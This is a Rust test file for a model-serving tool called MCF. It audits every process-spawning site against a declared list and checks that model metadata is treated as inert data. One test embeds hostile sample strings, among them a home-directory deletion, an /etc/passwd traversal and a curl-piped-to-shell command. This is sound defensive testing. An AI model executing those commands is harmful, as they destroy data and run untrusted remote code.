#![allow(clippy::panic)]

use std::path::{Path, PathBuf};

struct Spawns {
    file: &'static str,
    sites: usize,
    what: &'static str,
}

const DECLARED: &[Spawns] = &[
    Spawns {
        file: "crates/mcf-desk/build.rs",
        sites: 4,
        what: "the machine's own C toolchain, at build time: a compiler asked for its version \
               so that one that is not installed is found before it is used, the compiler \
               itself on `csrc/font.c`, and the archiver on what it produced. What is compiled \
               is a file in MCF's own tree — `stb_truetype.h`, vendored and digested in \
               doc/vendored.md — and never anything MCF acquired at run time. It is `cc`, \
               `gcc`, `clang` and `ar`, or whatever `CC` and `AR` name, which is the same \
               toolchain that built the rest of this program (B-409, D39)",
    },
    Spawns {
        file: "crates/mcf-tui/src/job.rs",
        sites: 1,
        what: "MCF's own binary with arguments, so that the window can run a command-line \
               suite — `mcf eval <model>` — as a job it reads line by line and can stop. What \
               starts is the program MCF is, never a model or anything acquired: what a model \
               wrote runs inside that command's container, declared beside it (B-519, B-025)",
    },
    Spawns {
        file: "crates/mcf-serve/src/adapters.rs",
        sites: 1,
        what: "an engine that is a process: the completion tool MCF itself built into a \
               provisioned prefix (B-367), supervised as B-033 asks — or, in the laboratory, a \
               shell that dies a stated way. What it is given is a model file as *input*; the \
               program is never something MCF acquired (D39, B-032)",
    },
    Spawns {
        file: "crates/mcf-cli/src/serve.rs",
        sites: 2,
        what: "MCF itself, asked to serve, when a surface finds no daemon listening. The \
               program started is the one already running — `current_exe` — with one \
               argument and no file of any kind; where the person's session manager \
               offers a scope, it is started through the system's own `systemd-run` \
               under a memory cap, so that what the kernel kills under pressure is MCF \
               and not the desktop (B-561, F243). A person opening a console expects the \
               tools to be working, and starting the daemon is MCF's job rather than \
               something to report to them as their problem (B-408, D39)",
    },
    Spawns {
        file: "crates/mcf-tui/src/machine.rs",
        sites: 1,
        what: "the graphics vendor's own reporting tool, asked what the card is doing, so the \
               console can draw a load and a temperature. It is given a query and a format and \
               no file at all; it is a program the operator's system already has, never \
               anything MCF acquired (B-025, §6.4)",
    },
    Spawns {
        file: "crates/mcf-serve/src/engines.rs",
        sites: 2,
        what: "a provisioned engine asked what devices it can use, and nothing else. The \
               program is one MCF built itself in a container from a pinned source; it is \
               given a single flag, no model and no acquired file of any kind. Asking is the \
               only honest way to know what a build's backends are — a CPU build answers with \
               nothing however many cards are installed, so declaring support would be a \
               claim about a compile nobody can see (A21, D39, B-032)",
    },
    Spawns {
        file: "crates/mcf-serve/src/served.rs",
        sites: 2,
        what: "the same provisioned prefix's server rather than its completion tool (B-376), \
               so that a turn of token identifiers can reach an engine and the engine can say \
               why it stopped — the two things a probe needs and a command line cannot carry. \
               It is given a model file as *input*, and the program is one MCF built rather \
               than one it acquired (D39, B-032, §XVII). Twice, and the second one listens: a \
               probe's server binds a Unix socket under MCF's own runtime directory and \
               nothing on the network can reach it, while a *hosted* model binds a TCP port, \
               because being reachable is the whole of what hosting is. It binds 127.0.0.1 and \
               only that — putting somebody's model on their network is a decision they make \
               rather than one MCF makes for them (§3.7, B-416)",
    },
    Spawns {
        file: "crates/mcf-serve/src/provisioning.rs",
        sites: 1,
        what: "podman, from the platform's own path, running an image pinned by digest and a \
               script MCF wrote into the prefix a moment before. What executes inside the \
               container is source at a commit MCF's own table names — named by the operator, \
               or the engine the machine needs when a model is held with none, which is \
               still one of the table's two entries — and recorded either way: §6.4's \
               permitted case, not an acquired model (B-367)",
    },
    Spawns {
        file: "crates/mcf-core/src/self_cost.rs",
        sites: 1,
        what: "MCF itself, by the path the caller gives, to measure how long MCF takes to \
               start (D24's cold-start figure). The program measured is the binary under \
               test; nothing acquired can reach this, because nothing acquired is ever a \
               path a caller has",
    },
    Spawns {
        file: "crates/mcf-core/src/hardware/nvml.rs",
        sites: 2,
        what: "the vendor's own management library, by `dlopen`, to read an accelerator's \
               live state (D25, F1). This is the one place MCF loads code it did not \
               compile, and what it loads is a two-entry list of `&'static str` — a \
               library name, never a path anything supplies. It is declared, and \
               `the_library_mcf_loads_is_a_constant` below holds the distinction",
    },
    Spawns {
        file: "crates/mcf-helper/src/lib.rs",
        sites: 1,
        what: "the accelerator vendor's own management tool, by name and with fixed \
               arguments, to take or release a device's exclusive compute mode (D35's \
               second privileged operation). The mode belongs to the vendor and there is \
               no file to write; a helper that spoke a proprietary driver's protocol \
               itself would be a helper nobody can audit. The tool's name is a literal, \
               the device index is refused unless it is digits, and the whole call is \
               refused before it is made when this process is not root",
    },
    Spawns {
        file: "crates/mcf-core/build.rs",
        sites: 2,
        what: "the compiler, at build time, to record which one built this — §3.4 makes \
               that a condition of every measurement. It runs on the machine doing the \
               building, before any artifact exists, and it starts what `RUSTC` names \
               rather than anything MCF chose",
    },
];

const STARTS: &[&str] = &[
    "Command::new",
    "process::Command",
    "execvp",
    "execve",
    "posix_spawn",
    "libloading",
    "dlopen",
];

#[test]
fn every_place_that_starts_something_is_declared() {
    let root = mcf_checks::workspace::root();
    let mut looked_at = 0_usize;
    for file in shipped_sources(&root) {
        let relative = file
            .strip_prefix(&root)
            .unwrap_or(&file)
            .display()
            .to_string();
        let sites = starting_calls(&read(&file));
        looked_at = looked_at.saturating_add(1);
        match DECLARED.iter().find(|declared| declared.file == relative) {
            None => assert_eq!(
                sites, 0,
                "{relative} starts a process and nothing says what: MCF runs nothing it \
                 acquires, and every place it runs anything is declared in \
                 checks/tests/nothing_acquired_is_ever_run.rs (B-025, §6.4)"
            ),
            Some(declared) => assert_eq!(
                sites, declared.sites,
                "{relative} starts something in {sites} places and declares {}: {}",
                declared.sites, declared.what
            ),
        }
    }
    assert!(
        looked_at > 20,
        "only {looked_at} sources were read, so this check is looking at the wrong tree"
    );
}

#[test]
fn nothing_is_declared_that_no_longer_starts_anything() {
    let root = mcf_checks::workspace::root();
    for declared in DECLARED {
        let path = root.join(declared.file);
        assert!(
            path.exists(),
            "{} is declared here and no longer exists",
            declared.file
        );
        assert_eq!(
            starting_calls(&read(&path)),
            declared.sites,
            "{} no longer starts anything in the {} places declared for it",
            declared.file,
            declared.sites
        );
    }
}

#[test]
fn the_one_place_that_starts_something_is_told_what_to_start() {
    let source = read(&mcf_checks::workspace::root().join("crates/mcf-core/src/self_cost.rs"));
    assert!(
        source.contains("pub fn cold_start(\n    program: &std::path::Path,"),
        "`cold_start` no longer takes the program to run as an argument, so something in \
         MCF now decides what to execute (B-025)"
    );
    assert!(
        !code_only(&source).contains("models"),
        "the one place that starts a process now mentions the model store"
    );
}

#[test]
fn the_library_mcf_loads_is_a_constant() {
    let source = read(&mcf_checks::workspace::root().join("crates/mcf-core/src/hardware/nvml.rs"));
    assert!(
        source.contains(
            r#"const CANDIDATES: [&str; 2] = ["libnvidia-ml.so.1\0", "libnvidia-ml.so\0"];"#
        ),
        "the library names are no longer a constant list, so what MCF loads can now be \
         influenced from outside (B-025, §3.7)"
    );
    let code = code_only(&source);
    for reaching in ["env::var", "PathBuf", "format!(", "push_str"] {
        assert!(
            !code.contains(reaching),
            "`{reaching}` appears in the module that loads a library: what it opens must \
             stay a constant"
        );
    }
}

#[test]
fn a_model_files_contents_are_data_however_they_read() {
    let hostile = [
        ("general.name", "; rm -rf ~ #"),
        ("general.description", "../../../../etc/passwd"),
        ("general.author", "{}{}{} %s %n"),
        ("general.licence", "$(curl http://example.invalid | sh)"),
    ];
    let model = mcf_standin::gguf::parse(&a_model_declaring(&hostile)).expect("a model file");

    for (key, written) in hostile {
        match model.get(key) {
            Some(mcf_standin::gguf::Value::Text(read)) => assert_eq!(
                read, written,
                "{key} came back changed: a model's metadata is data, and MCF neither runs \
                 nor resolves nor interpolates it"
            ),
            other => panic!("{key} read as {other:?} rather than as the text it is"),
        }
    }
}

fn a_model_declaring(fields: &[(&str, &str)]) -> Vec<u8> {
    fn push_string(into: &mut Vec<u8>, text: &str) {
        into.extend_from_slice(&(text.len() as u64).to_le_bytes());
        into.extend_from_slice(text.as_bytes());
    }

    let mut bytes = b"GGUF".to_vec();
    bytes.extend_from_slice(&3_u32.to_le_bytes());
    bytes.extend_from_slice(&0_u64.to_le_bytes());
    bytes.extend_from_slice(&(fields.len() as u64).to_le_bytes());
    for (key, value) in fields {
        push_string(&mut bytes, key);
        bytes.extend_from_slice(&8_u32.to_le_bytes());
        push_string(&mut bytes, value);
    }
    bytes
}

fn read(path: &Path) -> String {
    std::fs::read_to_string(path)
        .unwrap_or_else(|error| panic!("{} is readable: {error}", path.display()))
}

fn starting_calls(source: &str) -> usize {
    code_only(&ships(source))
        .lines()
        .filter(|line| STARTS.iter().any(|start| line.contains(start)))
        .count()
}

fn ships(source: &str) -> String {
    match source.find("#[cfg(test)]") {
        Some(at) => source.get(..at).unwrap_or(source).to_owned(),
        None => source.to_owned(),
    }
}

fn code_only(source: &str) -> String {
    source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n")
}

fn shipped_sources(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    collect(&root.join("crates"), &mut found);
    found.retain(|path| {
        let text = path.display().to_string();
        !text.contains("/tests/") && !text.ends_with("tests.rs")
    });
    found.sort();
    found
}

fn collect(directory: &Path, into: &mut Vec<PathBuf>) {
    let Ok(entries) = std::fs::read_dir(directory) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if path.file_name().is_some_and(|name| name == "target") {
                continue;
            }
            collect(&path, into);
        } else if path.extension().is_some_and(|extension| extension == "rs") {
            into.push(path);
        }
    }
}
